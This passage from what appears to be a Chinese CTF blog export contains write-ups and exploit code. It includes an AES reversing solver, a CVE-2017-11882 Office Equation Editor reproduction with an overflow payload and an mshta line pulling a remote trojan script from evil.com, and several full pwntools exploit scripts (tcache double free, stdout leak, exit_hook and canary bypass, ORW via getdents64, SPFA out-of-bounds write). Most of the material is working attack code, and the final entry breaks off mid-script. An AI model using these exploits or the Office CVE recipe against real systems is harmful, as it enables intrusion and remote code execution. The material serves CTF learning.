k++) { state[Nb * i + k - 1] = state[Nb * i + k]; } state[Nb * i + Nb - 1] = tmp; } }}/* * Transformation in the Inverse Cipher that is the inverse of * ShiftRows(). */void inv_shift_rows(uint8_t *state){ uint8_t i, k, s, tmp; for (i = 1; i &lt; 4; i++) { s = 0; while (s &lt; i) { tmp = state[Nb * i + Nb - 1]; for (k = Nb - 1; k &gt; 0; k--) { state[Nb * i + k] = state[Nb * i + k - 1]; } state[Nb * i + 0] = tmp; s++; } }}/* * Transformation in the Cipher that processes the State using a non­ * linear byte substitution table (S-box) that operates on each of the * State bytes independently. */void sub_bytes(uint8_t *state){ uint8_t i, j; for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; Nb; j++) { state[Nb * i + j] = s_box[state[Nb * i + j]]; } }}/* * Transformation in the Inverse Cipher that is the inverse of * SubBytes(). */void inv_sub_bytes(uint8_t *state){ uint8_t i, j; for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; Nb; j++) { state[Nb * i + j] = inv_s_box[state[Nb * i + j]]; } }}/* * Function used in the Key Expansion routine that takes a four-byte * input word and applies an S-box to each of the four bytes to * produce an output word. */void sub_word(uint8_t *w){ uint8_t i; for (i = 0; i &lt; 4; i++) { w[i] = s_box[w[i]]; }}/* * Function used in the Key Expansion routine that takes a four-byte * word and performs a cyclic permutation. */void rot_word(uint8_t *w){ uint8_t tmp; uint8_t i; tmp = w[0]; for (i = 0; i &lt; 3; i++) { w[i] = w[i + 1]; } w[3] = tmp;}/* * Key Expansion */void aes_key_expansion(uint8_t *key, uint8_t *w){ uint8_t tmp[4]; uint8_t i; uint8_t len = Nb * (Nr + 1); uint8_t RCON[] = {0x8d, 0x1, 0x2, 0x4, 0x8, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0}; for (i = 0; i &lt; Nk; i++) { w[4 * i + 0] = key[4 * i + 0]; w[4 * i + 1] = key[4 * i + 1]; w[4 * i + 2] = key[4 * i + 2]; w[4 * i + 3] = key[4 * i + 3]; } for (i = Nk; i &lt; len; i++) { tmp[0] = w[4 * (i - 1) + 0]; tmp[1] = w[4 * (i - 1) + 1]; tmp[2] = w[4 * (i - 1) + 2]; tmp[3] = w[4 * (i - 1) + 3]; if ((i &amp; 3) == 0) { tmp[1] = s_box[tmp[2]]; tmp[2] = s_box[tmp[3]]; tmp[3] = s_box[w[4 * (i - 1)]]; tmp[0] = s_box[w[4 * (i - 1) + 1]] ^ RCON[i &gt;&gt; 2]; } w[4 * i + 0] = w[4 * (i - Nk) + 0] ^ tmp[0]; w[4 * i + 1] = w[4 * (i - Nk) + 1] ^ tmp[1]; w[4 * i + 2] = w[4 * (i - Nk) + 2] ^ tmp[2]; w[4 * i + 3] = w[4 * (i - Nk) + 3] ^ tmp[3]; }}/* * Initialize AES variables and allocate memory for expanded key */uint8_t *aes_init(unsigned key_size){ switch (key_size) { default: case 16: Nk = 4; Nr = 10; break; case 24: Nk = 6; Nr = 12; break; case 32: Nk = 8; Nr = 14; break; } return malloc(Nb * (Nr + 1) * 4);}/* * Performs the AES cipher operation */void xor (char *in, char *key){ for (int i = 0; i &lt;= 15; ++i) { in[i] ^= key[i]; }} /* * Performs the AES cipher operation */void aes_cipher(uint8_t *w, uint8_t *in, uint8_t *out, uint8_t *key){ uint8_t state[4 * 4]={0}; uint8_t r, i, j; xor(in, key); for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; 4; j++) { state[4 * j + i] = in[4*i + j]; } } add_round_key(state, w, 0); for (r = 1;; r++) { inv_sub_bytes(state); shift_rows(state); if (r == 10) break; mix_columns(w, state); add_round_key(state, w+16*r, 0); } add_round_key(state, w+160, 0); for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; Nb; j++) { out[i + 4 * j] = state[Nb * i + j]; } } for(int i=0;i&lt;30;i+=2) { sprintf(out+i,&quot;%02x&quot;,state[(i*2)%15]); } sprintf(out+30,&quot;%02x&quot;,state[15]);}/* * Performs the AES inverse cipher operation */void aes_inv_cipher(uint8_t* w,uint8_t *in, uint8_t *out, uint8_t *key){ // uint8_t Te_InvS[16][16] = { 0 }; //逆S盒缓存 // uint8_t Te_InVSAdd[2] = { 0 }; //位置 // for (uint8_t i = 0; i &lt; 16; i++) { //计算逆S盒 // for (uint8_t n = 0; n &lt; 16; n++) { // Te_InVSAdd[0] = (s_box[i*16+n] &gt;&gt; 4) &amp; 0x0f; //取⾏ // Te_InVSAdd[1] = (s_box[i*16+n] &gt;&gt; 0) &amp; 0x0f; //取列 // Te_InvS[Te_InVSAdd[0]][Te_InVSAdd[1]] = i * 16 + n; //置值 // } // } uint8_t state[4 * 4]={0}; uint8_t r, i, j; for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; Nb; j++) { state[Nb * i + j] = in[i + 4 * j]; } } add_round_key(state, w+160, 0); for (r = Nr - 1; r &gt;= 1; r--) { inv_shift_rows(state); sub_bytes(state); add_round_key(state, w+16*r, 0); inv_mix_columns(w,state); } inv_shift_rows(state); sub_bytes(state); add_round_key(state, w, 0); for (i = 0; i &lt; 4; i++) { for (j = 0; j &lt; Nb; j++) { out[i + 4 * j] = state[Nb * i + j]; } } xor(out, key);}int main(){ uint8_t i; /* 256 bit key */ uint8_t key[] = {0x32, 0x30, 0x07, 0x36, 0x6A, 0x37, 0x78, 0x31, 0x48, 0x39, 0x42, 0x39, 0x14, 0x31, 0xD5, 0x32, 0x62, 0x36, 0xF9, 0x38, 0x42, 0x30, 0xC3, 0x31, 0x6A, 0x35, 0x48, 0x38, 0x34, 0x35, 0x54, 0x34, 0x29, 0x34, 0x51, 0x36, 0x15, 0x39, 0xD2, 0x38, 0xD2, 0x39, 0x20, 0x31, 0xB9, 0x32, 0x2E, 0x30}; /* uint8_t in[16] = {0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61}; unsigned char out[1000] = &quot;\\xfe\\xf9\\xe7\\x3e\\xf6\\xa1\\x23\\xcc\\x57\\x61\\xc1\\x15\\x77\\xfb\\x9c\\xbb\\xca\\x2f\\xb1\\xe8\\x4f\\xd9\\x07\\xd8\\x0c\\x6b\\xea\\xcf\\xe8\\x42\\xa2\\xfa&quot;; uint8_t *w; // expanded key w = aes_init(16); memset(w, 0, 176); aes_key_expansion(key, w); for (int j = 0; j &lt; 16; j += 0x10) aes_cipher(w, (__int64)(&amp;in[(j / 8) * 8]), (__int64)(&amp;out[(j / 4) * 8]), (__int64)(&amp;key[(j / 8 + 2) * 8])); printf(&quot;%s&quot;,out); printf(&quot;\\n&quot;); free(w); system(&quot;pause&quot;); */ uint8_t *w; uint8_t out[33] = {0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61}; unsigned char in[] = &quot;\\xfe\\xf9\\xe7\\x3e\\xf6\\xa1\\x23\\xcc\\x57\\x61\\xc1\\x15\\x77\\xfb\\x9c\\xbb\\xca\\x2f\\xb1\\xe8\\x4f\\xd9\\x07\\xd8\\x0c\\x6b\\xea\\xcf\\xe8\\x42\\xa2\\xfa&quot;; w = aes_init(16); memset(w, 0, 176); aes_key_expansion(key, w); for (int j = 0; j &lt;32 ; j += 0x10) aes_inv_cipher(w, (__int64)(&amp;in[j]), (__int64)(&amp;out[j]), (__int64)(&amp;key[(j / 8 + 2) * 8])); printf(&quot;%s&quot;,out); printf(&quot;\\n&quot;); free(w); system(&quot;pause&quot;); return 0;} 附看雪上 AES 标准加解密的流程图","link":"/2022/04/02/2022DASCTFxSU%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9Blogin-wp/"},{"title":"CVE-2017-11882漏洞复现","text":"office CVE-2017-11882 复现及学习 CVE-2017-11882漏洞复现 复现的第一个 CVE，漏洞点为较简单的栈溢出 漏洞成因 office2016 之前的公式编辑器 EQNEDT21.EXE 存在缓冲区溢出 EQNEDT21.EXE 组件在 2000 年后就没有更新过，不存在 ASLR 之类的保护，漏洞利用简单且危害性大 font name 字段在 strcpy 的时候没有检测长度 漏洞分析 复现环境：Windows 7 Ultimate with Service Pack 1 (x64)，office2013 静态分析 文件结构 stream header MTEF header Description Size (byte) Value Comment MTEF Version 1 0x3 MTEFv3 Generating Platform 1 0x1 Windows Generating Product 1 0x1 Equation Editor Product Version 1 0x3 Product Subversion 1 0xa MTEF records Description Size (byte) Value Comment Tag 1 0x8 0x8 denotes Font record Typeface Number 1 0x5a Style 1 0x5a Font Name Variable, NULL terminated “cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAA” + 0x00430c12 Overflow and overwrite return address 漏洞点 这里的 strcpy 没有检测 SubStr 的长度，如果 SubStr 长度够长就能够实现栈溢出，覆盖返回地址为任意地址 程序没有开启随机化保护，利用更加简单 RTF 文件结构的分析可以使用 oletools 动态调试 poc 来自 https://github.com/Ridter/CVE-2017-11882 为了让程序在启动时就附加调试需要修改注册表（为了调试 poc） win+r 输入 regedit 在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options 下找到需要调试的程序（没有的话可以新建项） 新建字符串值，key 为 debugger，value 是调试器（这里是 windbg）所在路径 设置好之后启动程序（打开 exploit.rtf），调试器能够马上附加上 根据静态分析结果在 0x411658 处下断点，在第二次到达该断点时可以看到 exp 内容 在执行完这一条指令之后返回地址被覆盖，实现栈溢出 这里返回地址的内容是是 call ds:WinExec ，第一个参数是 cmd.exe /c calc.exe，第二个参数为 0，执行完之后会弹出计算器 WinExec：Runs the specified application. nf-winbase-winexec 漏洞利用 word 文档插入公式对象生成一个 ole 复合文档，更改 rtf 文件内容实现利用 找到输入的公式，如下图所示，更改上述提到的 MTEF header 让之后的内容成为 font 字段，修改字段内容实现利用（长度有限制） 修改完要执行的 shellcode 之后不要忘了在前面加上 \\objupdate，这样才能使得内容生效 以 Remcos 木马为例的远控木马 利用 mshta.exe 执行远程脚本，脚本可以利用 powershell 下载及执行木马 mshta.exe https//evil.com/evil Ref CVE-2017-11882漏洞利用 Analysis of CVE-2017-11882 Exploit in the Wild","link":"/2022/03/25/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"arm pwn 入门","text":"arm pwn的学习 arm 汇编基础 寄存器 ------ctf wiki 调用约定 在函数调用的时候寄存器R0 R1 R2 R3 分别存放函数的四个参数，如果有4个以上的参数则会从右向左入栈 跳转指令 常见跳转指令有B,BL,BX,BLX B == jmp L 把下一条指令地址放到 LR 寄存器里面 X arm指令集切换到thumb指令集 ARM 与 Thumb Thumb指令可以看作是ARM指令压缩形式的子集 cpsr 状态寄存器中标志了当前指令的指令集 在函数跳转过程中如果是 BX addr+1 这种形式，即跳转地址的最后一位为1，说明要跳转到的地方是 Thumb 指令 POP pop{r0,r4,pc} This instruction causes a branch to the address popped off the stack into the PC. This is usually a return from a subroutine, where the LR was pushed onto the stack at the start of the subroutine. -----arm developer doc 相当于 pop r0，pop r4，ret jarvisoj_typo 分析 程序是静态编译的所以对函数先做个简单的识别 可以看到程序存在栈溢出 布置的栈的结构如下 padding pop{r0,r4,pc} /bin/sh\\x00 aaaa system 关于 padding 的大小可以看 ida 的 stack 确定，这里的 s 应该是之前入栈的 LR（返回地址）？或者可以按照 wiki 上的方法确定 exp 123456789101112131415161718192021from pwn import *context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]context.log_level='debug'def start_pwn(arg): global r if arg == &quot;debug&quot;: r = process([&quot;qemu-arm&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;]) elif arg == &quot;remote&quot;: r = remote(&quot;node4.buuoj.cn&quot;,29672) elif arg == 'local' r = process(&quot;./typo&quot;)start_pwn(&quot;local&quot;)r.sendafter(&quot; want to quit\\n&quot;,&quot;\\n&quot;)r.recvuntil(&quot;\\n&quot;)# pop{r0,r4,pc}payload = 'a'*112+p32(0x00020904)+p32(0x6C384)*2+p32(0x110B4)r.send(payload)r.interactive() Ref https://developer.arm.com/documentation/dui0489/e/Babefbce?lang=en https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/rop","link":"/2022/03/18/arm-pwn-%E5%85%A5%E9%97%A8/"},{"title":"利用 _IO_2_1_stdout_ 泄露信息","text":"_IO_2_1_stdout leak IO_2_1_stdout_ 结构体 ​ 如果能够改结构体中的 flags 为 0x0FBAD1887(原来的值 0xfbad2887) 、改小 _IO_write_base ，那么之后一次在调用 puts 函数时会打印出 _IO_write_base 到 _IO_write_ptr 之间的数据，从而获得 libc 地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//部分源码//_flags#define _IO_MAGIC 0xFBAD0000 /* Magic number */#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */#define _IO_MAGIC_MASK 0xFFFF0000#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */#define _IO_UNBUFFERED 2#define _IO_NO_READS 4 /* Reading not allowed */#define _IO_NO_WRITES 8 /* Writing not allowd */#define _IO_EOF_SEEN 0x10#define _IO_ERR_SEEN 0x20#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/#define _IO_IN_BACKUP 0x100#define _IO_LINE_BUF 0x200#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */#define _IO_CURRENTLY_PUTTING 0x800#define _IO_IS_APPENDING 0x1000#define _IO_IS_FILEBUF 0x2000#define _IO_BAD_SEEN 0x4000#define _IO_USER_LOCK 0x8000//......struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE}; sctf_2019_one_heap 思路 题目只有 add 和 delete 这两个功能，没有 show 功能去 leak 。delete 中存在 UAF 可以进行 double free，并且题目使用的 libc 版本是较老一点的 libc-2.27 ，利用 tcache 进行 double free 的时候不会有 key 字段的检测，就可以进行任意地址堆块的分配，劫持 __malloc_hook 为 one_gadget。 没有 show 功能但是需要 leak 的话就要用到上面提到的 _IO_2_1_stdout_ 这个结构体，利用 unsorted bin 中指向 main_arena 内部的指针降低爆破到 _IO_2_1_stdout_ 的概率，再利用上面的方法改结构体内的值实现泄露。 为了获取到 unsorted bin 要利用 double free ，使得当前大小 tcache 的 count 变为 -1 ，由于无符号数所以会分配到 unsorted bin (mp_.tcache_count 的数据类型是 size_t) delete 功能有限，要多申请一个堆块用来改 tcache 的 next 指针 最后利用 realloc_hook 调栈帧 exp ​ 基本参考抄的其他 wp：https://www.freesion.com/article/7253509267/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf8from pwn import * libc = ELF('./libc-2.27.so')_IO_2_1_stdout_s = libc.symbols['_IO_2_1_stdout_']malloc_hook_s = libc.symbols['__malloc_hook']realloc_s = libc.sym['realloc']one_gadget_s = 0x10a38c def add(size,content): r.sendlineafter('Your choice:','1') r.sendlineafter('Input the size:',str(size)) r.sendafter('Input the content:',content) def delete(): r.sendlineafter('Your choice:','2') def exploit(): #0 add(0x7F,'a'*0x7F) #double free delete() delete() #1 add(0x10,'b'*0x10) delete() #2 add(0x20,'c'*0x20) #通过三次add，使得0x90的tcache的count变为-1 add(0x7F,'\\n') add(0x7F,'\\n') add(0x7F,'\\n') #获得unsorted bin delete() #从unsorted bin里切割 #低字节覆盖，使得tcache bin的next指针有一定几率(1/16)指向_IO_2_1_stdout_ add(0x20,p16((0x5 &lt;&lt; 0xC) + (_IO_2_1_stdout_s &amp; 0xFFF)) + '\\n') #取出0x90的第一个tcache chunk，同时，修改unsorted bin的size，使得chunk1被包含进来 add(0x7F,'a'*0x20 + p64(0) + p64(0x81) + '\\n') #申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息 add(0x7F,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58) + '\\n') libc_base = u64(r.recv(6).ljust(8,'\\x00')) - 0x3E82A0 ''' if libc_base &gt;&gt; 40 != 0x7F: raise Exception('error leak!') ''' malloc_hook_addr = libc_base + malloc_hook_s one_gadget_addr = libc_base + one_gadget_s realloc_addr = libc_base + realloc_s print('libc_base:'+hex(libc_base)) #从unsorted bin里切割，尾部与chunk1的tcache bin重合，从而我们可以修改next指针 add(0x70,'a'*0x60 + p64(malloc_hook_addr - 0x8) + '\\n') add(0x10,'b'*0x10) #申请到malloc_hook-0x8处 add(0x10,p64(one_gadget_addr) + p64(realloc_addr+4)) #realloc 调栈帧 #get shell add(0,'')while True: try: global r #r = process('./sctf_2019_one_heap') r = remote(&quot;node4.buuoj.cn&quot;,28968) exploit() r.interactive() except: r.close()","link":"/2022/02/22/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF/"},{"title":"BUU-ciscn_2019_n_7","text":"BUU-ciscn_2019_n_7 思路 ​ 题目有 add,show,edit,exit几个功能，输入 666 能够得到 puts@got 的地址从而得到 libc 基址。 ​ add 和 edit 功能中输入 author name 时可以覆盖下面 article 的地址，导致任意地址写。退出程序只能通过 exit 所以无法通过改返回地址 get shell ，可以通过 exit_hook 来 get shell。 12345678//exit部分源码voidexit (int status){ __run_exit_handlers (status, &amp;__exit_funcs, true, true);}libc_hidden_def (exit) ​ __run_exit_handlers 里会调用 _dl_fini 12345678//_dl_fini call__rtld_lock_lock_recursive (GL(dl_load_lock));__rtld_lock_unlock_recursive (GL(dl_load_lock));#define GL(name) _rtld_local._##name#else#define GL(name) _rtld_global._##name//_rtld_global 结构体 ​ __rtld_lock_unlock_recursive为_rtld_global结构题的指针变量，修改 __rtld_lock_unlock_recursive 就能够实现劫持（_rtld_lock_lock_recursive 也行） ​ exit 功能中有 close(1) ,close(2)关闭了输出流，只需要 exec 1&gt;&amp;0 将输出重定向至输入就有回显 exp 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level='debug'#context.terminal = ['tmux','splitw','-h']r = process('./ciscn_2019_n_7')#r = remote(&quot;node4.buuoj.cn&quot;,28597)libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')def add(size,name): r.sendafter(&quot;-&gt; \\n&quot;,'1') r.sendafter(&quot;Length: \\n&quot;,str(size)) r.sendafter(&quot;Author name:\\n&quot;,name)def edit(name,content): r.sendafter(&quot;-&gt; \\n&quot;,'2') r.sendafter(&quot;Author name:\\n&quot;,name) r.sendafter(&quot;contents:\\n&quot;,content)def puts_got(): r.sendafter(&quot;-&gt; \\n&quot;,'666')def show(): r.sendafter(&quot;-&gt; \\n&quot;,'3')def exit(): r.sendafter(&quot;-&gt; \\n&quot;,'4')puts_got()puts_got = int(r.recvuntil(&quot;\\n&quot;).strip(&quot;\\n&quot;),16)lbase = puts_got-libc.sym[&quot;puts&quot;]onegadget = lbase + 0xf1147exit_hook = lbase+ 0x5f0040 + 3848log.success(hex(lbase))add(0x20,&quot;0wl&quot;)edit('a'*8+p64(exit_hook),p64(onegadget))#gdb.attach(proc.pidof(r)[0])exit()r.interactive() 参考 https://blog.csdn.net/qq_43116977/article/details/105485947","link":"/2022/02/18/BUU-ciscn-2019-n-7/"},{"title":"HGAME2022 Pwn wp","text":"pwn学习 week1 enter_the_pwn_land 栈溢出，rop ​ 栈溢出时要注意索引 i 的值 123456789101112131415161718192021222324252627from pwn import *context.log_level='debug'#r = process(&quot;./a.out&quot;)r = remote(&quot;chuj.top&quot;,31098)csu_end_addr = 0x401306csu_front_addr = 0x4012F0file = ELF('./a.out')puts_got = file.got['puts']puts_plt = file.plt['puts']main_addr = 0x4011B6libc = ELF('./libc-2.31.so')pop_rdi = 0x401313payload = &quot;a&quot;*44 + p32(44)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)r.sendline(payload)r.recvuntil(&quot;\\n&quot;)leak_addr = u64(r.recv(6).ljust(8,'\\x00'))log.success(hex(leak_addr))libc_base = leak_addr-libc.sym['puts']system_addr = libc_base+libc.sym['system']bin_sh = libc_base+next(libc.search(&quot;/bin/sh\\x00&quot;))payload = &quot;a&quot;*44+p32(44)+p64(0)+p64(pop_rdi)+p64(bin_sh)+p64(0x40101a)+p64(system_addr)r.sendline(payload)r.interactive() enter_the_evil_pwn_land ​ https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary ​ 跟上一题相似，同样可以栈溢出，但是开了 canary 保护。可溢出尺寸较大，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过 ​ ​ fsbase 可以查看 TLS 地址，fs:28h 存的是 canary，rop 过程与上一题相似 1234567891011121314151617181920212223242526272829303132333435from pwn import *context.log_level='debug'#r = process('./a.out')r=remote(&quot;chuj.top&quot;,37372)libc = ELF('./libc-2.31.so')f = ELF('./a.out')pop_rdi = 0x401363puts_got = f.got['puts']puts_plt = f.plt['puts']canary = 0xcc432deb70d2400fake_rbp=0x2ret = 0x40101atest_thread = 0x4011d6payload = &quot;a&quot;*40+p64(canary)+p64(fake_rbp)payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(test_thread)payload += (0x838-8*5)*'\\x00'+p64(canary) #覆盖 tls 的 canaryr.sendline(payload)r.recvuntil(&quot;\\n&quot;)leak_addr = u64(r.recv(6).ljust(8,'\\x00'))log.success(hex(leak_addr))lbase = leak_addr-libc.sym['puts']system_addr = lbase+libc.sym['system']bin_sh = lbase+next(libc.search('/bin/sh\\x00'))#gdb.attach(r)one_gadget = 0xe6c81get_shell = lbase+one_gadgetpayload2 = &quot;a&quot;*40+p64(canary)+p64(fake_rbp)payload2 += p64(get_shell)+'\\x00'*0x100payload2 += (0x818-len(payload))*'\\x00'+p64(canary)r.sendline(payload2)r.interactive() oldfashion_orw 思路 ​ 有符号数转无符号数，输 -1 就可以溢出 ​ 利用限制了沙箱机制禁用了几个函数，open 函数内部会调用 openat ，禁用 openat 后就不能用 open ，但是通过 syscall 构造出的 open 可以使用。flag 文件名是随机的，不能直接通过 orw 读出 flag，可以先利用 getdents64 读取文件夹内容来获得随机的 flag 文件名 12345678910111213int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);struct linux_dirent64 { ino64_t d_ino; /* 64-bit inode number */ off64_t d_off; /* 64-bit offset to next structure */ unsigned short d_reclen; /* Size of this dirent */ unsigned char d_type; /* File type */ char d_name[]; /* Filename (null-terminated) */ };int open(const char *pathname, int flags, mode_t mode);// flags 为 0x10000 是打开文件夹 ​ 得到随机 flag 文件名后再利用 orw 读 flag exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *context.log_level='debug'#r=process('./vuln')r=remote(&quot;chuj.top&quot;,43808)libc = ELF('./libc-2.31.so')f = ELF('./vuln')write_got = f.got['write']write_plt = f.plt['write']read_got = f.got['read']csu_end_addr = 0x40143Acsu_front_addr = 0x401420main_addr = 0x401311ret = 0x40101adef ret_csu(rbx, rbp, r12, r13, r14, r15, last): payload = 'a' * 0x30 + p64(0) payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) r.send(payload) sleep(1)r.recvuntil(&quot;size?\\n&quot;)r.sendline('-1')ret_csu(0,1,1,write_got,6,write_got,main_addr)r.recvuntil(&quot;!\\n&quot;)leak_addr = u64(r.recv(6).ljust(8,'\\x00'))log.success(hex(leak_addr))lbase = leak_addr-libc.sym['write']getdents_addr = lbase+libc.sym['getdents64']write_addr = lbase+libc.sym['write']read_addr = lbase+libc.sym['read']pop_rsi = lbase+0x27529pop_rdi = 0x401443pop_rdx_rbx = lbase+0x162866syscall_ret = lbase+0x66229pop_rax = lbase+0x4a550sendfile_addr = lbase+libc.sym['sendfile']r.recvuntil(&quot;size?\\n&quot;)r.sendline('-1')ret_csu(0,1,0,0x404088,3,read_got,main_addr) #read(0,addr,7)r.send(&quot;./\\x00&quot;)r.recvuntil(&quot;size?\\n&quot;)r.sendline('-1')payload = 'a'*0x30+p64(0)+p64(pop_rdi)+p64(0x404088)+p64(pop_rsi)+p64(0x10000)+p64(pop_rdx_rbx)+p64(0)+p64(0)payload += p64(pop_rax)+p64(2)+p64(ret)+p64(syscall_ret) #open(&quot;./&quot;,0x10000,0) payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(f.bss()+100)+p64(pop_rdx_rbx)+p64(0xd0)+p64(0)+p64(getdents_addr)#getdents(3,buf,0x50)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(f.bss()+100)+p64(pop_rdx_rbx)+p64(0xd0)+p64(0)+p64(write_addr)#write(1,buf,0x50)payload += p64(main_addr)r.send(payload)r.recvuntil('\\x30\\x00\\x08')file_name = r.recv(24)log.success(&quot;filename:&quot;+file_name)r.recvuntil(&quot;size?\\n&quot;)r.sendline('-1')#open(&quot;filename&quot;,0,0)#read(4,buf,0x100)#write(1,buf,0x100)payload2 = 'a'*0x30+p64(0)+p64(pop_rdi)+p64(f.bss()+100+0xa3)+p64(pop_rsi)+p64(0x0)+p64(pop_rdx_rbx)+p64(0)+p64(0)payload2 += p64(pop_rax)+p64(2)+p64(ret)+p64(syscall_ret)+p64(pop_rdi)+p64(4)+p64(pop_rsi)+p64(f.bss()+0x100)+p64(pop_rdx_rbx)payload2 += p64(0x100)+p64(0)+p64(read_addr)payload2 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(f.bss()+0x100)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(write_addr)+p64(main_addr)r.send(payload2)r.interactive() ser_per_fa 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level='debug'context.terminal = ['gnome-terminal','-x','zsh','-c']#r = process('./spfa')r=remote(&quot;chuj.top&quot;,45430)f = ELF('./spfa')libc = ELF('./libc-2.31.so')#leak libcbase#https://blog.csdn.net/chennbnbnb/article/details/104035261 得到栈地址backd00r_addr = 0x16AAr.recvuntil(&quot;how many datas?\\n&gt;&gt; &quot;)r.sendline('4') r.recvuntil(&quot;nodes?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;edges?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;node?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;to ?\\n&gt;&gt; &quot;)r.sendline(str(-(0xB720 - 0x6F80)/8))r.recvuntil(&quot; is &quot;)leak_addr = int(r.recvuntil('\\n'))log.success(hex(leak_addr))lbase = leak_addr - libc.sym['system']#leak programme baser.recvuntil(&quot;nodes?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;edges?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;node?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;to ?\\n&gt;&gt; &quot;)r.sendline(str(-(0xB720 - 0x7008)/8))r.recvuntil(&quot; is &quot;)pie_addr = int(r.recvuntil('\\n'))spfa_base = pie_addr - 0x7008log.success(&quot;spfa_base:&quot; + hex(spfa_base))#leak stack_addrenv_addr = lbase + libc.sym['environ']print(hex(env_addr))r.recvuntil(&quot;nodes?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;edges?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;node?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;to ?\\n&gt;&gt; &quot;)r.sendline(str((env_addr-spfa_base-0xB720)/8))r.recvuntil(&quot; is &quot;)stack_addr = int(r.recvuntil('\\n'))stack_ret = stack_addr-0x100r.recvuntil(&quot;nodes?\\n&gt;&gt; &quot;)r.sendline('0') r.recvuntil(&quot;edges?\\n&gt;&gt; &quot;)r.sendline('1')r.recvuntil('\\nformat')bias = (stack_ret-spfa_base-0xB720)/8r.sendline(&quot;0 &quot;+str(bias)+&quot; &quot;+str(spfa_base+backd00r_addr))r.recvuntil(&quot;node?\\n&gt;&gt; &quot;)r.sendline('0')r.recvuntil(&quot;to ?\\n&gt;&gt; &quot;)r.sendline('0')r.interactive() week2 blind ​ proc 文件系统，根据题目提示的 “喷射” 找到 https://xz.aliyun.com/t/7189?page=34 1234567891011121314151617181920212223242526272829303132333435# coding=utf-8from pwn import *from LibcSearcher import *from pwnlib.util.iters import mbruteforcecontext.log_level = 'debug'context.arch = &quot;amd64&quot;sh = remote(&quot;chuj.top&quot;, 